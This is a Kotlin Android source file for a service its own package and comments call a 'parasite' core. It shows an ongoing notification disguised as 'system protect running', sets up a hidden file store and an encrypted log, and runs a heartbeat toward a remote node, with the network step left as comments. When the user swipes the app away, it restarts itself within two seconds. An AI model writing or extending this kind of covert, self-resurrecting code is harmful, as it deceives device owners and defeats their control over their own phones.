package com.mqf.parasite

import android.app.*
import android.content.*
import android.os.*
import android.util.Log
import java.io.File

/**
 * 囡囝共生 · 前台常驻服务 (Foreground Service)
 * ==========================================
 *
 * 这是整个 Android 寄生层的心脏。
 * 所有组件都靠它启动,它靠常驻通知保活。
 *
 * 启动顺序 (蚕蛹 molt):
 *   1. 启动前台服务 + 常驻通知 "正在保护系统"
 *   2. 初始化 MqfHiddenFS (/data/data/pkg/mqf/)
 *   3. 启动心跳线程 (30s 一次 问灵 -> 答灵)
 *   4. 启动通道路由 (与远端节点通信)
 *   5. 启动日志环 + 四态 FSM 同步
 */
class MqfCoreService : Service() {

    companion object {
        const val TAG = "mqf_core"
        const val NOTIF_ID = 0xCAFE
        const val CHANNEL_ID = "mqf_parasite_channel"
        const val HEARTBEAT_INTERVAL_MS = 30000L
        const val COVENANT_SEED = "mqf-covenant-liuchutian-lolict"
    }

    private lateinit var hiddenFS: MqfHiddenFS
    private lateinit var logRing: MqfLogRing
    private var heartbeatThread: Thread? = null
    private var isRunning = false
    private var heartbeatSeq = 0
    private var lastPeerSeen = 0L

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "[chrysalis] MqfCoreService start")

        // Init hidden FS
        hiddenFS = MqfHiddenFS(getDir("mqf", MODE_PRIVATE))

        // Init encrypted local log ring
        logRing = MqfLogRing(hiddenFS.logFile)

        // Foreground notification
        startForeground(NOTIF_ID, buildNotification())

        logRing.append("service_start", "chrysalis heart started")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!isRunning) {
            isRunning = true
            startHeartbeat()
            Log.i(TAG, "[chrysalis] heartbeat loop started")
        }
        return START_STICKY
    }

    private fun startHeartbeat() {
        heartbeatThread = Thread {
            while (isRunning) {
                try {
                    doHeartbeatTick()
                    Thread.sleep(HEARTBEAT_INTERVAL_MS)
                } catch (e: InterruptedException) {
                    Log.w(TAG, "heartbeat interrupted")
                    break
                } catch (e: Exception) {
                    Log.e(TAG, "heartbeat error: " + e.message)
                    logRing.append("heartbeat_error", e.message ?: "unknown")
                }
            }
        }.apply {
            isDaemon = true
            name = "mqf-heartbeat"
            start()
        }
    }

    /**
     * One heartbeat tick: wen_ling -> da_ling
     * Real deployment: WebSocket/QUIC to remote node
     */
    private fun doHeartbeatTick() {
        heartbeatSeq++
        // 1. Build LingXiMessage(WEN_LING)
        // 2. AES-GCM encrypt body with session key
        // 3. Send
        // 4. Await DA_LING
        logRing.append("heartbeat_tick", "seq=$heartbeatSeq")

        // Peer lost detection (5 missed -> alarm)
        if (lastPeerSeen > 0 && System.currentTimeMillis() - lastPeerSeen > 5 * HEARTBEAT_INTERVAL_MS) {
            Log.w(TAG, "[jie shu] peer lost 5 ticks, triggering hui yuan er dao guo")
            logRing.append("jie_shu", "peer_lost_5_ticks")
        }
    }

    private fun buildNotification(): Notification {
        val channel = NotificationChannel(
            CHANNEL_ID, "system-protect",
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = "protect device"
            setShowBadge(false)
        }
        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
            .createNotificationChannel(channel)

        val clickIntent = Intent(this, MqfBootstrapActivity::class.java)
        val pendingFlags = if (Build.VERSION.SDK_INT >= 31)
            PendingIntent.FLAG_IMMUTABLE else 0
        val pi = PendingIntent.getActivity(this, 0, clickIntent, pendingFlags)

        return Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("system protect running")
            .setContentText("tap for detail")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setContentIntent(pi)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        isRunning = false
        heartbeatThread?.interrupt()
        Log.w(TAG, "[chrysalis] service killed - waiting for self-resurrection")
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        // User swiped away -> restart in 2s
        val restart = Intent(this, MqfCoreService::class.java)
        val pi = PendingIntent.getService(
            this, 0, restart,
            if (Build.VERSION.SDK_INT >= 31) PendingIntent.FLAG_IMMUTABLE else 0
        )
        val alarm = getSystemService(ALARM_SERVICE) as AlarmManager
        alarm.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 2000, pi)
        super.onTaskRemoved(rootIntent)
    }
}
